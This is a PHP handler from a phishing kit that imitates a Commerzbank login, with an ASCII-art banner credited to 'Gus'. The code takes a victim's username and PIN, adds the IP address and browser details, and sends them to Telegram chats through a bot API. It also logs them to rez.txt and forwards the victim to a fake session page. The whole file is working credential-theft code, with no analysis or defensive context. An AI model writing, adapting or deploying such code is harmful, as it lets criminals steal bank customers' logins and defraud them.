﻿<?php
/*


 
###############################################
#$            Coded By Gus                   $#
###############################################

                                                 .o@*hu           
                          ..      .........   .u*"    ^Rc         
                        oP""*Lo*#"""""""""""7d" .d*N.   $         
                       @  u@""           .u*" o*"   #L  ?b        
                      @   "              " .d"  .d@@e$   ?b.      
                     8                    @*@me@#         '"Nu    
                    @                                        '#b  
                  .P                                           $r 
                .@"                                  $L        $  
              .@"                                   8"R      dP   
           .d#"                                  .dP d"   .d#     
          xP              .e                 .ud#"  dE.o@"(       
          $             s*"              .u@*""     '""\dP"       
          ?L  ..                    ..o@""        .$  uP          
           #c:$"*u.             .u@*""$          uR .@"           
            ?L$. '"""***Nc    x@""   @"         d" JP             
             ^#$.        #L  .$     8"         d" d"              
               '          "b.'$.   @"         $" 8"               
                           '"*@$L $"         $  @                 
                           @L    $"         d" 8\                 
                           $$u.u$"         dF dF                  
                           $ """   o      dP xR                   
                           $      dFNu...@"  $                    
                           "N..   ?B ^"""   :R                    
                             """"* RL       d>                    
                                    "$u.   .$                     
                                      ^"*bo@"

*/
session_start();
if($_POST['teilnehmer'] == ""){
  exit(header('location: ../'));
}
include "../config/telegram.php";
include "../config/settings.php";
$_SESSION['user'] =$_POST['teilnehmer'];
$ip = getenv("REMOTE_ADDR");
 foreach($IdTelegram as $chatId) {
  $message = "[=====>  🏦  Commerz  |  LOGIN  🏦  <=====]\n\n";
  $message .= "[ 🤖 USER  :      ".$_POST['teilnehmer']."\n";
  $message .= "[ 🔐 PIN :      ".$_POST['pin']."\n";
  $message .= "[ 3  :      ".$_POST['selec']."\n\n";
  $message .= "[=====> VICTIM INFROMATIONS <=====]\n\n";
  $message .= "[ IP :    ".$ip."\n";   
  $message .= "[ OS :    ".$user_os."\n";  
  $message .= "[ Browser :    ".$user_browser."\n";  
  $message .= "[ UA :    ".$_SERVER['HTTP_USER_AGENT']."\n"; 
  $website= "https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId, 
      'text'=>$message,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
 }
$myfile = fopen("rez.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
header("location: ../account_sessionAuth.php");
?>
